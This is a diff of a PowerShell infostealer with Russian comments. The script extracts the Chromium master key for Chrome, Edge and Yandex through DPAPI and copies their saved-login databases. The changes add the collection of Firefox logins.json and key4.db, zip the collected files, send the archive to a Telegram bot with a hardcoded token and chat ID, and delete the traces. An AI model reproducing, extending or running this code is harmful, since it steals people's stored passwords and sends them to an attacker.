@@ -1,50 +1,56 @@
-# [ Настройки Telegram ]
 $token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
 $chatID = "806761221"
-$reportFile = "$env:TEMP\passwords_report.txt"
+$workDir = "$env:TEMP\work_$(Get-Random)"
+New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+$reportFile = "$workDir\keys.txt"
 
-# Функция для расшифровки Chromium (Chrome, Edge, Yandex)
-function Get-ChromiumPasswords($path, $localStatePath, $browserName) {
-    if (!(Test-Path $path) -or !(Test-Path $localStatePath)) { return }
-    
-    try {
-        # 1. Извлекаем и расшифровываем мастер-ключ через DPAPI
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
-        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-
-        # 2. Копируем базу во временный файл (чтобы не была занята)
-        $tmpDb = "$env:TEMP\tmp_db"
-        Copy-Item $path -Destination $tmpDb -Force
-        
-        # 3. Чтение данных (упрощенный поиск строк, так как SQLite API может отсутствовать)
-        # Для полноценного парсинга SQLite без библиотек используется поиск паттернов
-        Add-Content $reportFile "`n--- $browserName ---"
-        Add-Content $reportFile "База скопирована. Для полной дешифровки используйте мастер-ключ на своей стороне:"
-        Add-Content $reportFile "Master Key ($browserName): $([Convert]::ToBase64String($masterKey))"
-    } catch {
-        Add-Content $reportFile "Ошибка при обработке $browserName: $_"
+# --- Функция для Chromium (Chrome, Edge, Yandex) ---
+function Get-Chromium($path, $localStatePath, $name) {
+    if (Test-Path $localStatePath) {
+        try {
+            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+            $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
+            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+            Add-Content $reportFile "$name MasterKey: $([Convert]::ToBase64String($masterKey))"
+            
+            # Копируем базу для ручного разбора
+            if (Test-Path $path) { Copy-Item $path -Destination "$workDir\$name`_LoginData" -Force }
+        } catch { Add-Content $reportFile "$name: Ошибка дешифровки ключа" }
     }
 }
 
-# Пути к браузерам
-$browsers = @{
+# --- Пути ---
+$paths = @{
     "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data";
     "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
     "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
 }
 
-# Очистка старого отчета
-if (Test-Path $reportFile) { Remove-Item $reportFile }
-
-# Сбор данных
-foreach ($b in $browsers.Keys) {
-    $base = $browsers[$b]
-    Get-ChromiumPasswords "$base\Default\Login Data" "$base\Local State" $b
+foreach ($n in $paths.Keys) {
+    $base = $paths[$n]
+    Get-Chromium "$base\Default\Login Data" "$base\Local State" $n
 }
 
-# Отправка готового отчета
-if (Test-Path $reportFile) {
-    & curl.exe -F "chat_id=$chatID" -F "document=@$reportFile" "https://api.telegram.org/bot$token/sendDocument"
-    Remove-Item $reportFile
+# --- Firefox ---
+$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $ffBase) {
+    Get-ChildItem $ffBase -Directory | ForEach-Object {
+        $l = Join-Path $_.FullName "logins.json"
+        $k = Join-Path $_.FullName "key4.db"
+        if (Test-Path $l) {
+            Copy-Item $l -Destination "$workDir\FF_$($_.Name)_logins.json" -Force
+            Copy-Item $k -Destination "$workDir\FF_$($_.Name)_key4.db" -Force
+        }
+    }
+}
+
+# --- Отправка ---
+$zip = "$env:TEMP\report.zip"
+if (Test-Path $workDir) {
+    Compress-Archive -Path "$workDir\*" -DestinationPath $zip -Force
+    & curl.exe -F "chat_id=$chatID" -F "document=@$zip" "https://api.telegram.org/bot$token/sendDocument"
+    
+    # Чистка
+    Remove-Item -Recurse -Force $workDir
+    Remove-Item -Force $zip
 }
